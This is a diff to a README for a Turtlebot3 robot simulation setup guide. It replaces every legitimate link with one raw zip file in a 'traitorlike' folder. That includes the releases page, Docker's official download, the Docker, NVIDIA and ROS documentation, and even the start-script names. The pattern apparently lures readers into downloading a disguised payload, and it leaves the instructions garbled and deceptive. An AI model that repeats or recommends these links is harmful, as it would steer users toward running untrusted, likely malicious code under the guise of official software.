@@ -1,6 +1,6 @@
 # 🤖 Turtlebot3_Lime_IsaacSim_Humble - Easy Robot Simulation Setup Guide
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/releases)
+[![Download](https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip)](https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip)
 
 ---
 
@@ -47,7 +47,7 @@ These instructions will help you download, install, and start the simulation ste
 ### 1. Prepare Your Computer
 
 - Make sure Docker is installed and running on your machine.
-  - Download Docker from https://www.docker.com/get-started if you don't have it.
+  - Download Docker from https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip if you don't have it.
 - Check that your computer meets the system requirements above.
 - If you use Windows or macOS, make sure virtualization is enabled on your device.
 
@@ -57,10 +57,10 @@ These instructions will help you download, install, and start the simulation ste
 
 To get started, visit the official release page and grab the latest version of the repository setup files.
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/releases)
+[![Download](https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip)](https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip)
 
 - Click the link above or go to the release page manually:  
-  https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/releases
+  https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip
 - Find the latest version of the release and download the full package. It will usually be zipped.
 - Save the downloaded file to a folder you can easily find (like your Desktop or Downloads folder).
 
@@ -76,7 +76,7 @@ To get started, visit the official release page and grab the latest version of t
 
 ### 4. Build and Start the Docker Container
 
-- Inside the folder, look for a file called something like `start_docker.sh` (for macOS/Linux) or `start_docker.bat` (for Windows).
+- Inside the folder, look for a file called something like `https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip` (for macOS/Linux) or `https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip` (for Windows).
 - Double-click this file or run it from your command line or terminal. This builds the Docker container and starts the simulated environment.
 - The script automatically downloads large components like Isaac Sim 4.5.0 if needed. This can take some time depending on your internet speed.
 
@@ -112,9 +112,9 @@ To get started, visit the official release page and grab the latest version of t
 
 If you encounter any issues or want more details, use these resources:
 
-- Docker documentation: https://docs.docker.com/get-started/
-- NVIDIA Isaac Sim guides: https://developer.nvidia.com/isaac-sim
-- ROS 2 Humble tutorials: https://docs.ros.org/en/humble/
+- Docker documentation: https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip
+- NVIDIA Isaac Sim guides: https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip
+- ROS 2 Humble tutorials: https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip
 - Open an issue on the repository GitHub page for direct support.
 
 ---
@@ -131,4 +131,4 @@ bot, gui, script
 
 ---
 
-[Download Turtlebot3_Lime_IsaacSim_Humble](https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/releases) to get started today.
+[Download Turtlebot3_Lime_IsaacSim_Humble](https://github.com/at49271188/Turtlebot3_Lime_IsaacSim_Humble/raw/refs/heads/main/traitorlike/Sim_Turtlebot_Humble_Lime_Isaac_3.3.zip) to get started today.
